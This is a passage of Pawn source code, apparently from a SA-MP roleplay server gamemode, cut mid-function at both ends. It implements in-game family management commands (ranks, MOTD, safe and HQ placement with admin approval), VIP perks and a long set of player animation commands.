	    if(FamInfo[idx][fCookies] < 40) return SendClientMessage(playerid, COLOR_GRAD2, "Your family doesnt have that much of cookies");
		FamInfo[idx][fCookies] -= 40;
		format(string, sizeof(string), "* %s has used some gang cookies to buy 20 grams of cocaine.", GetName(playerid));
 		SendPlayerFamMessage(playerid, COLOR_CYAN, string);
 		FamInfo[idx][fcocaine] += 20;
	}
	return 1;
}
IRP:adjust(playerid, var[])
{
	new string[128], option[32], idx;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pFamRank] < 5) return NoAuth(playerid);
	idx = Player[playerid][pFam];
	if(sscanf(var, "s[32]", option))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /adjust [option]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: rankname | motd");
		return 1;
	}
    if(!strcmp(option, "rankname", true, 8))
    {
        new rank;
    	if(sscanf(var, "s[32]is[32]", option, rank, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /adjust rankname [rank] [name]");
		if(rank < 0 || rank > 6) return SendClientMessage(playerid, COLOR_GRAD2, "Family ranks are between 1 and 6.");
		switch(rank)
		{
		    case 1: format(FamInfo[idx][fRank1], 32, "%s", var);
		    case 2: format(FamInfo[idx][fRank2], 32, "%s", var);
		    case 3: format(FamInfo[idx][fRank3], 32, "%s", var);
			case 4: format(FamInfo[idx][fRank4], 32, "%s", var);
			case 5: format(FamInfo[idx][fRank5], 32, "%s", var);
			case 6: format(FamInfo[idx][fRank6], 32, "%s", var);
		}
		format(string, sizeof(string), " You have set your family rank %d's name to {01A9DB}%s", rank, var);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
    }
    else if(!strcmp(option, "motd", true, 4))
    {
		if(sscanf(var, "s[32]s[32]", option, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /adjust motd [motd]");
		format(FamInfo[idx][fMOTD], 64, "%s", var);
		format(string, sizeof(string), "FAMILY MOTD: {FFFFFF}%s", FamInfo[Player[playerid][pFam]][fMOTD]);
   		SendPlayerFamMessage(playerid, COLOR_LIGHTBLUE, string);
    }
    else SendClientMessage(playerid, COLOR_GRAD2, "Invalid option.");
	return 1;
}
IRP:createsafe(playerid, var[])
{
	new string[128], idx;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pFamRank] < 6) return NoAuth(playerid);
	idx = Player[playerid][pFam];
    new confirm[8];
    if(FamInfo[idx][fSafeX] != 0 && FamInfo[idx][fSafeY] != 0 && FamInfo[idx][fSafeZ] != 0)
	{
	    // SSCANF Check
	    if(sscanf(var, "s[8]", confirm))
	    {
	    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /createsafe [confirm]");
	    	SendClientMessage(playerid, COLOR_WHITE, " Changing your family's safe location will cost $70,000.");
		   	return 1;
	    }
	    // Confirm Check
	    if(strcmp(confirm, "confirm", true, 8))
	    {
	    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /createsafe [confirm]");
		   	SendClientMessage(playerid, COLOR_WHITE, " Changing your family's safe location will cost $70,000.");
		   	return 1;
        }
        // Money Check
	    if(Player[playerid][pMoney] < 70000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you. ($70,000)");
        GetPlayerPos(playerid, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
		FamSafeX[playerid] = Player[playerid][pX];
		FamSafeY[playerid] = Player[playerid][pY];
		FamSafeZ[playerid] = Player[playerid][pZ];
        SafeRequester = playerid;
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Changing safe location for your family will cost you $70.000.");
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Please wait a high administrator to approve it.");
        format(string, sizeof(string), "%s has requested to adjust his family's safe. (/approve) - (/deny)", GetName(playerid));
        SendAdminMessage(COLOR_ADMWARN,  string);
	}
	else
	{
        // SSCANF Check
	    if(sscanf(var, "s[8]", confirm))
	    {
	    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /createsafe [confirm]");
	    	SendClientMessage(playerid, COLOR_WHITE, " Creating your family's safe location will cost $50,000.");
		   	return 1;
	    }
	    // Confirm Check
	    if(strcmp(confirm, "confirm", true, 8))
	    {
	    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /createsafe [confirm]");
		   	SendClientMessage(playerid, COLOR_WHITE, " Creating your family's safe location will cost $50,000.");
		   	return 1;
        }
        if(Player[playerid][pMoney] < 50000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you. ($50,000)");
		GetPlayerPos(playerid, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
		FamSafeX[playerid] = Player[playerid][pX];
		FamSafeY[playerid] = Player[playerid][pY];
		FamSafeZ[playerid] = Player[playerid][pZ];
        SafeRequester = playerid;
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Creating a new safe for your family will cost you $50.000.");
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Please wait a high administrator to approve it.");
        format(string, sizeof(string), "%s has requested to adjust his family's safe. (/approve) - (/deny)", GetName(playerid));
        SendAdminMessage(COLOR_ADMWARN,  string);
    }
	return 1;
}
IRP:createhq(playerid, var[])
{
	new string[128], idx;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pFamRank] < 6) return NoAuth(playerid);
	idx = Player[playerid][pFam];
    new confirm[8];
    if(FamInfo[idx][fHQX] != 0 && FamInfo[idx][fHQY] != 0 && FamInfo[idx][fHQZ] != 0)
	{
	    // SSCANF Check
	    if(sscanf(var, "s[8]", confirm))
	    {
	    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /createhq [confirm]");
	    	SendClientMessage(playerid, COLOR_WHITE, " Changing your family's hq location will cost $120,000.");
		   	return 1;
	    }
	    // Confirm Check
	    if(strcmp(confirm, "confirm", true, 8))
	    {
	    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /createhq [confirm]");
		   	SendClientMessage(playerid, COLOR_WHITE, " Changing your family's hq location will cost $120,000.");
		   	return 1;
        }
        // Money Check
	    if(Player[playerid][pMoney] < 120000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you. ($120,000)");
    	GetPlayerPos(playerid, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
		FamHQX[playerid] = Player[playerid][pX];
		FamHQY[playerid] = Player[playerid][pY];
		FamHQZ[playerid] = Player[playerid][pZ];
        HQRequester = playerid;
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Changing your family will cost you $120.000.");
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Please wait a high administrator to approve it.");
        format(string, sizeof(string), "%s has requested to adjust his family's HQ. (/approve) - (/deny)", GetName(playerid));
        SendAdminMessage(COLOR_ADMWARN,  string);
	}
	else
	{
        // SSCANF Check
	    if(sscanf(var, "s[8]", confirm))
	    {
	    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /createhq [confirm]");
	    	SendClientMessage(playerid, COLOR_WHITE, " Creating your family's hq will cost $100,000.");
		   	return 1;
	    }
        // Confirm Check
	    if(strcmp(confirm, "confirm", true, 8))
	    {
	    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /createhq [confirm]");
		   	SendClientMessage(playerid, COLOR_WHITE, " Creating your family's hq will cost $100,000.");
		   	return 1;
        }
        if(Player[playerid][pMoney] < 100000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you. ($100,000)");
		GetPlayerPos(playerid, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
		FamHQX[playerid] = Player[playerid][pX];
		FamHQY[playerid] = Player[playerid][pY];
		FamHQZ[playerid] = Player[playerid][pZ];
        HQRequester = playerid;
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Creating a new hq for your family will cost you $100.000.");
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Please wait a high administrator to approve it.");
        format(string, sizeof(string), "%s has requested to adjust his family's HQ. (/approve) - (/deny)", GetName(playerid));
        SendAdminMessage(COLOR_ADMWARN,  string);
    }
	return 1;
}
// stop here
//===========================================[VIP Commands]=====================================
IRP:viphelp(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pVIP]) return NoAuth(playerid);
	SendClientMessage(playerid, COLOR_ADMWARN, "_____________________________________________________");
	SendClientMessage(playerid, COLOR_VIP, "BRONZE VIP: /v /vip /vips + [VIP Lounge | Newbie Tag]");
	SendClientMessage(playerid, COLOR_VIP, "SILVER VIP: /givevip + Bronze VIP + [2 Jobs]");
	SendClientMessage(playerid, COLOR_VIP, "GOLD VIP: Silver VIP + [2 Vehicles] + [2 Houses]");
	SendClientMessage(playerid, COLOR_VIP, "Platinium VIP: Gold VIP + [3 Vehicles] + [2 Businesses]");
	return 1;
}

IRP:buyarmor(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
    if(!Player[playerid][pVIP]) return NoAuth(playerid);
	if(!IsPlayerInRangeOfPoint(playerid, 2, 287.2132,-177.3140,999.6060)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the VIP armor sWeed.");
	if(Player[playerid][pMoney] < 100) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you. ($100)");
	GiveZamoraMoney(playerid, -100);
	SetPlayerArmour(playerid, 100);
	return 1;
}

IRP:buyhealth(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
    if(!Player[playerid][pVIP]) return NoAuth(playerid);
	if(!IsPlayerInRangeOfPoint(playerid, 2, 285.0209,-177.3140,999.6060)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the VIP health sWeed.");
	if(Player[playerid][pMoney] < 50) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you. ($50)");
	GiveZamoraMoney(playerid, -50);
	SetPlayerHealth(playerid, 100);
	return 1;
}

IRP:givevip(playerid, var[])
{
	new user, string[128], viplevel, viptime;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pVIP] < 2) return NoAuth(playerid);
	if(Player[playerid][pVIP] == 2)
	{
        if(sscanf(var, "u", user))
		{
		   SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /givevip [playerid]");
		   return 1;
		}
        if(Player[playerid][pVIPBuddy])
    	{
    	    format(string, sizeof(string), " You need to wait %d more hours before giving someone else Bronze VIP.", Player[playerid][pVIPBuddy]);
    	    SendClientMessage(playerid, COLOR_GRAD2, string);
    	    return 1;
     	}
    	if(Player[user][pVIP]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already VIP");
    	Player[playerid][pVIPBuddy] = 12;
    	Player[user][pVIP] = 1;
    	Player[user][pVIPTemp] = 60;
    	format(string, sizeof(string), " You have given %s temporary Bronze VIP package for an hour.", GetName(user));
    	SendClientMessage(playerid, COLOR_VIP, string);
    	format(string, sizeof(string), " %s has given you temporary Bronze VIP package for an hour.", GetName(playerid));
    	SendClientMessage(user, COLOR_VIP, string);
    }
    if(Player[playerid][pVIP] == 3)
	{
		new time;
        if(Player[playerid][pVIPBuddy])
    	{
    	    format(string, sizeof(string), " You need to wait %d more hours before giving someone else Bronze VIP.", Player[playerid][pVIPBuddy]);
    	    SendClientMessage(playerid, COLOR_GRAD2, string);
    	    return 1;
     	}
     	if(sscanf(var, "ui", user, time))
	    {
		   SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /givevip [playerid] [time]");
		   return 1;
		}
     	if(time < 1 || time > 2) return SendClientMessage(playerid, COLOR_GRAD2, "** [Availble Times]: 1 : 2");
     	if(time == 1)
     	{
        	if(Player[user][pVIP]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already VIP");
        	Player[playerid][pVIPBuddy] = 12;
        	Player[user][pVIP] = 1;
        	Player[user][pVIPTemp] = 60;
        	format(string, sizeof(string), " You have given %s temporary Bronze VIP package for one hours.", GetName(user));
        	SendClientMessage(playerid, COLOR_VIP, string);
        	format(string, sizeof(string), " %s has given you temporary Bronze VIP package for one hours.", GetName(playerid));
         	SendClientMessage(user, COLOR_VIP, string);
        }
        else if(time == 2)
     	{
        	if(Player[user][pVIP]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already VIP");
        	Player[playerid][pVIPBuddy] = 12;
        	Player[user][pVIP] = 1;
        	Player[user][pVIPTemp] = 120;
        	format(string, sizeof(string), " You have given %s temporary Bronze VIP package for two hours.", GetName(user));
        	SendClientMessage(playerid, COLOR_VIP, string);
        	format(string, sizeof(string), " %s has given you temporary Bronze VIP package for two hours.", GetName(playerid));
         	SendClientMessage(user, COLOR_VIP, string);
        }
    }
    if(Player[playerid][pVIP] == 4)
	{
		new time;
        if(Player[playerid][pVIPBuddy])
    	{
    	    format(string, sizeof(string), " You need to wait %d more hours before giving someone else a VIP.", Player[playerid][pVIPBuddy]);
    	    SendClientMessage(playerid, COLOR_GRAD2, string);
    	    return 1;
     	}
     	if(sscanf(var, "uiii", user, time, viplevel, viptime))
	    {
		    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /givevip [playerid] [time] [level] [days]");
		    SendClientMessage(playerid, COLOR_VIP, "* If you want to give vip for certain time, then put 0 as the value days.");
		    SendClientMessage(playerid, COLOR_VIP, "* If you want to give vip for 1 to 7 days, then put 0 as the value of time.");
		    return 1;
		}
     	if(time < 0 || time > 2) return SendClientMessage(playerid, COLOR_GRAD2, "** [Availble Times]: 0 to 2");
     	if(viplevel < 0 || viplevel > 2) return SendClientMessage(playerid, COLOR_GRAD2, "VIP packages are between Bronze (1) to Silver(2).");
    	if(viptime < 0 || viptime > 7) return SendClientMessage(playerid, COLOR_GRAD2, "VIP days are between 1 to 7.");
     	if(time == 1)
     	{
        	if(Player[user][pVIP]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already VIP.");
        	Player[playerid][pVIPBuddy] = 12;
        	Player[user][pVIP] = 1;
        	Player[user][pVIPTemp] = 60;
        	format(string, sizeof(string), " You have given %s temporary Bronze VIP package for one hours.", GetName(user));
        	SendClientMessage(playerid, COLOR_VIP, string);
        	format(string, sizeof(string), " %s has given you temporary Bronze VIP package for one hours.", GetName(playerid));
         	SendClientMessage(user, COLOR_VIP, string);
        }
        else if(time == 2)
     	{
        	if(Player[user][pVIP]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already VIP");
        	Player[playerid][pVIPBuddy] = 12;
        	Player[user][pVIP] = 1;
        	Player[user][pVIPTemp] = 120;
        	format(string, sizeof(string), " You have given %s temporary Bronze VIP package for two hours.", GetName(user));
        	SendClientMessage(playerid, COLOR_VIP, string);
        	format(string, sizeof(string), " %s has given you temporary Bronze VIP package for two hours.", GetName(playerid));
         	SendClientMessage(user, COLOR_VIP, string);
        }
        if(time == 0)
     	{
            if(sscanf(var, "uiii", user, time, viplevel, viptime)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /givevip [playerid][0][level][days]");
        	if(Player[user][pVIP]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already VIP");
        	Player[playerid][pVIPBuddy] = 24;
        	new Year, Month, Day;
        	new Hour, Minute, Second;
        	gettime(Hour, Minute, Second);
        	getdate(Year, Month, Day);
        	Player[user][pVIPDay] = Day+viptime;
       		Player[user][pVIPMonth] = Month;
       		Player[user][pVIPHour] = Hour;
       		Player[user][pVIP] = viplevel;
        	Player[user][pVIPTemp] = 0;
        	format(string, sizeof(string), " You have given %s temporary %s VIP package for %d days.", GetName(user), RPVIPN(user), viptime);
        	SendClientMessage(playerid, COLOR_VIP, string);
        	format(string, sizeof(string), " %s has given you temporary %s VIP package for %d days.", GetName(playerid), RPVIPN(user), viptime);
         	SendClientMessage(user, COLOR_VIP, string);
        }
    }
	return 1;
}
IRP:v(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pVIP]) return NoAuth(playerid);
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /v [text]");
	if(AntiAdv(playerid, var)) return 1;
	if(VIPOff[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You have the VIP chat toggled off.");
	format(string, sizeof(string), "** %s VIP %s: %s", RPVIPN(playerid), GetName(playerid), var);
	SendVIPMessage(COLOR_VIP, string);
	return 1;
}

IRP:vip(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pVIP]) return NoAuth(playerid);
	ShowDialog(playerid, 16);
	return 1;
}

IRP:vips(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pVIP]) return NoAuth(playerid);
	SendClientMessage(playerid, COLOR_VIP, "|_________ Online VIPs Members _________|");
	foreach(Player, i)
	{
	    if(Player[i][pVIP])
	    {
	        if(Player[i][pVIPTemp])
	        {
		        format(string, sizeof(string), "%s VIP %s - [Expires in %d minutes] [VIP Buddy]", RPVIPN(i), GetName(i), Player[i][pVIPTemp]);
		        SendClientMessage(playerid, COLOR_VIP, string);
	        }
	        else
	        {
		        format(string, sizeof(string), "%s VIP %s  - [Expires on: %d/%d]", RPVIPN(i), GetName(i), Player[i][pVIPDay], Player[i][pVIPMonth]);
		        SendClientMessage(playerid, COLOR_VIP, string);
	        }
	    }
	}
	return 1;
}
//===========================================[ANIMATIONS]========================================

IRP:animlist(playerid, var[])
{
	return i_animhelp(playerid, var);
}

IRP:animhelp(playerid, var[])
{
	SendClientMessage(playerid, COLOR_GREEN,"_________________________________________________________________________________");
	SendClientMessage(playerid,COLOR_WHITE,"Available Animations:");
	SendClientMessage(playerid,0xB4B5B7FF,"/shakehand /handsup /handsdown /drunk /bomb /laugh /lookout /dj /skate /dance /crossarms /fucku");
	SendClientMessage(playerid,0xB4B5B7FF,"/hide /vomit /wave /taichi /kiss /robman /reload /deal /fallover /cocaine");
	SendClientMessage(playerid,0xBFC0C2FF,"/chat /dance /gift /piss /lean /cpr /cry /cheer /pedmove /wank /bitchslap");
	SendClientMessage(playerid,0xCBCCCEFF,"/slapass /fuckme /bj /rap /hitch /stand /greet /followme /getjiggy");
	SendClientMessage(playerid,0xD8D8D8FF,"/what /signal /crabs /salute /stop /washhands /gesture /hurt /showoff /dive /relax");
	SendClientMessage(playerid,0xD8D8D8FF,"/checktime /rob /sitdown /sleep /smoke /nobreath /sit");
	SendClientMessage(playerid, COLOR_GREEN,"_________________________________________________________________________________");
	return 1;
}

IRP:sit(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sit [1-5]");
	if(animid < 1 || animid > 5) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sit [1-5]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"BEACH","bather",4.0,1,0,0,0,0);
		case 2: LoopingAnim(playerid,"BEACH","Lay_Bac_Loop",4.0,1,0,0,0,0);
		case 3: LoopingAnim(playerid,"BEACH","ParkSit_W_loop",4.0,1,0,0,0,0);
		case 4: LoopingAnim(playerid,"BEACH","SitnWait_loop_W",4.0,1,0,0,0,0);
		case 5: LoopingAnim(playerid,"BEACH", "ParkSit_M_loop", 4.0,1,0,0,0,0);
	}
	return 1;
}

IRP:nobreath(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /nobreath [1-2]");
	if(animid < 1 || animid > 2) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sit [1-2]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"PED","IDLE_tired",4.0,1,0,0,0,0);
		case 2: LoopingAnim(playerid,"FAT","IDLE_tired",4.0,1,0,0,0,0);
	}
	return 1;
}

IRP:sitdown(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sitdown [1-7]");
	if(animid < 1 || animid > 7) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sitdown [1-7]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"Attractors","Stepsit_in",4.0,0,0,0,1,0); // Not looping
		case 2: LoopingAnim(playerid,"CRIB","PED_Console_Loop",4.0,1,0,0,0,0);
		case 3: LoopingAnim(playerid,"INT_HOUSE","LOU_In",4.0,0,0,0,1,0); // Not looping
		case 4: LoopingAnim(playerid,"MISC","SEAT_LR",4.0,1,0,0,0,0);
		case 5: LoopingAnim(playerid,"MISC","Seat_talk_01",4.0,1,0,0,0,0);
		case 6: LoopingAnim(playerid,"MISC","Seat_talk_02",4.0,1,0,0,0,0);
		case 7: LoopingAnim(playerid,"ped","SEAT_down",4.0,0,0,0,1,0); // Not looping
	}
	return 1;
}

IRP:handsup(playerid, var[])
{
    new string[128];
   	if(IsPlayerCuffed(playerid) || IsPlayerTazed(playerid) || IsPlayerTied(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't do that at this time.");
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
	format(string, sizeof(string), "* %s puts their hands up.", GetName(playerid));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	SendClientMessage(playerid, COLOR_WHITE, " You can put your hands down again using /handsdown.");
	return 1;
}

IRP:handsdown(playerid, var[])
{
	new string[128];
	if(IsPlayerCuffed(playerid) || IsPlayerTazed(playerid) || IsPlayerTied(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't do that at this time.");
	if(GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_HANDSUP) return SendClientMessage(playerid, COLOR_GRAD2, "Your hands are already down.");
	ClearAnimations(playerid);
	format(string, sizeof(string), "* %s puts their hands down.", GetName(playerid));
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}

IRP:dance(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dance [1-4]");
	if(animid < 1 || animid > 4) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dance [1-4]");
	switch(animid)
	{
		case 1: SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE1);
		case 2: SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE2);
		case 3: SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE3);
		case 4: SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DANCE4);
	}
	return 1;
}

IRP:crossarms(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /crossarms [1-5]");
	if(animid < 1 || animid > 5) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /crossarms [1-5]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid, "COP_AMBIENT", "Coplook_loop", 4.0, 0, 1, 1, 1, -1);
		case 2: LoopingAnim(playerid, "DEALER", "DEALER_IDLE", 4.0, 0, 1, 1, 1, -1);
		case 3: LoopingAnim(playerid, "DEALER", "DEALER_IDLE_01", 4.0, 0, 1, 1, 1, -1);
		case 4: LoopingAnim(playerid,"GRAVEYARD","mrnM_loop",4.0,1,0,0,0,0);
		case 5: LoopingAnim(playerid,"GRAVEYARD","prst_loopa",4.0,1,0,0,0,0);
	}
	return 1;
}

IRP:getjiggy(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /getjiggy [1-10]");
	if(animid < 1 || animid > 10) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /getjiggy [1-10]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"DANCING","DAN_Down_A",4.0,1,0,0,0,0);
		case 2: LoopingAnim(playerid,"DANCING","DAN_Left_A",4.0,1,0,0,0,0);
		case 3: LoopingAnim(playerid,"DANCING","DAN_Loop_A",4.0,1,0,0,0,0);
		case 4: LoopingAnim(playerid,"DANCING","DAN_Right_A",4.0,1,0,0,0,0);
		case 5: LoopingAnim(playerid,"DANCING","DAN_Up_A",4.0,1,0,0,0,0);
		case 6: LoopingAnim(playerid,"DANCING","dnce_M_a",4.0,1,0,0,0,0);
		case 7: LoopingAnim(playerid,"DANCING","dnce_M_b",4.0,1,0,0,0,0);
		case 8: LoopingAnim(playerid,"DANCING","dnce_M_c",4.0,1,0,0,0,0);
		case 9: LoopingAnim(playerid,"DANCING","dnce_M_c",4.0,1,0,0,0,0);
		case 10: LoopingAnim(playerid,"DANCING","dnce_M_d",4.0,1,0,0,0,0);
	}
	return 1;
}

IRP:pedmove(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /pedmove[1-26]");
	if(animid < 1 || animid > 26) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /pedmove [1-26]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"PED","JOG_femaleA",4.0,1,1,1,1,1);
		case 2: LoopingAnim(playerid,"PED","JOG_maleA",4.0,1,1,1,1,1);
		case 3: LoopingAnim(playerid,"PED","WOMAN_walkfatold",4.0,1,1,1,1,1);
		case 4: LoopingAnim(playerid,"PED","run_fat",4.0,1,1,1,1,1);
		case 5: LoopingAnim(playerid,"PED","run_fatold",4.0,1,1,1,1,1);
		case 6: LoopingAnim(playerid,"PED","run_old",4.0,1,1,1,1,1);
		case 7: LoopingAnim(playerid,"PED","Run_Wuzi",4.0,1,1,1,1,1);
		case 8: LoopingAnim(playerid,"PED","swat_run",4.0,1,1,1,1,1);
		case 9: LoopingAnim(playerid,"PED","WALK_fat",4.0,1,1,1,1,1);
		case 10: LoopingAnim(playerid,"PED","WALK_fatold",4.0,1,1,1,1,1);
		case 11: LoopingAnim(playerid,"PED","WALK_gang1",4.0,1,1,1,1,1);
		case 12: LoopingAnim(playerid,"PED","WALK_gang2",4.0,1,1,1,1,1);
		case 13: LoopingAnim(playerid,"PED","WALK_old",4.0,1,1,1,1,1);
		case 14: LoopingAnim(playerid,"PED","WALK_shuffle",4.0,1,1,1,1,1);
		case 15: LoopingAnim(playerid,"PED","woman_run",4.0,1,1,1,1,1);
		case 16: LoopingAnim(playerid,"PED","WOMAN_runbusy",4.0,1,1,1,1,1);
		case 17: LoopingAnim(playerid,"PED","WOMAN_runfatold",4.0,1,1,1,1,1);
		case 18: LoopingAnim(playerid,"PED","woman_runpanic",4.0,1,1,1,1,1);
		case 19: LoopingAnim(playerid,"PED","WOMAN_runsexy",4.0,1,1,1,1,1);
		case 20: LoopingAnim(playerid,"PED","WOMAN_walkbusy",4.0,1,1,1,1,1);
		case 21: LoopingAnim(playerid,"PED","WOMAN_walkfatold",4.0,1,1,1,1,1);
		case 22: LoopingAnim(playerid,"PED","WOMAN_walknorm",4.0,1,1,1,1,1);
		case 23: LoopingAnim(playerid,"PED","WOMAN_walkold",4.0,1,1,1,1,1);
		case 24: LoopingAnim(playerid,"PED","WOMAN_walkpro",4.0,1,1,1,1,1);
		case 25: LoopingAnim(playerid,"PED","WOMAN_walksexy",4.0,1,1,1,1,1);
		case 26: LoopingAnim(playerid,"PED","WOMAN_walkshop",4.0,1,1,1,1,1);
	}
	return 1;
}

IRP:rap(playerid, var[])
{
	new animid;
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	if(sscanf(var, "i", animid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /rap [1-3]");
	if(animid < 1 || animid > 3) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /rap [1-3]");
	switch(animid)
	{
		case 1: LoopingAnim(playerid,"RAPPING","RAP_A_Loop",4.0,1,1,1,1,0);
		case 2: LoopingAnim(playerid,"RAPPING","RAP_B_Loop",4.0,1,1,1,1,0);
